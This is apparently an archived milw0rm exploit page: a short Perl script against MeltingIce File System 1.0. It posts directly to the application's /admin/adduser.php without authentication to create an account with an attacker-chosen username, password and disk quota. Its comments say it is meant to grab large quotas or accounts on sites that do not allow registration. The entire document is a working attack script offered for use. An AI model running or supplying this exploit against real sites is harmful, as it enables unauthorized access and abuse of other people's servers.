<html><head><title>MeltingIce File System <= 1.0 Remote Arbitrary Add-User Exploit</title></head><pre>#!/usr/bin/perl

use strict;
use LWP::UserAgent;

# NOTE: user a pretty uniqe username, has the script will say successfull if a username aready existed!
# NOTE: exploit is mainly to get a nice quota, but it can also to be used to add a user primeraly because alot of these sites doesnt allow registration.
# Script Download: http://downloads.sourceforge.net/meltingicefs

print &quot;[*] --- [ MeltingIce File System &lt;= 1.0 Remote Arbitrary Add-User ] --- [*]\n&quot;;
print &quot;[*] ---Discovered &amp;&amp; Coded By: t0pP8uZz / Discovered On: 17 MAY 2008--- [*]\n&quot;;
print &quot;[*] --- MeltingIce is a file hosting script, this exploit will add  --- [*]\n&quot;;
print &quot;[*] --- a user via the admin panel, and give it a specified quota.  --- [*]\n&quot;;
print &quot;[*] --- [ MeltingIce File System &lt;= 1.0 Remote Arbitrary Add-User ] --- [*]\n&quot;;

print &quot;\nEnter URL(http://site.com/): &quot;;
	chomp(my $url=&lt;STDIN&gt;);
	
print &quot;\nUsername(create's your username): &quot;;
	chomp(my $usr=&lt;STDIN&gt;);
	
print &quot;\nPassword(create's your password): &quot;;
	chomp(my $pwd=&lt;STDIN&gt;);
	
print &quot;\nEnter Quota(quota(mb) of space you want, ie:9999): &quot;;
	chomp(my $qta=&lt;STDIN&gt;);

my $ua = LWP::UserAgent-&gt;new( agent =&gt; &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&quot; );
my $ob = $ua-&gt;post($url.&quot;/admin/adduser.php&quot;, { &quot;newusername&quot; =&gt; $usr, &quot;newpassword&quot; =&gt; $pwd, &quot;newquota&quot; =&gt; $qta } );

#is_success was acting strangely, so i had to do without.
print &quot;Completed! Try logging in &quot;.$url.&quot;\n&quot;; 
exit;

# milw0rm.com [2008-05-18]</pre></html>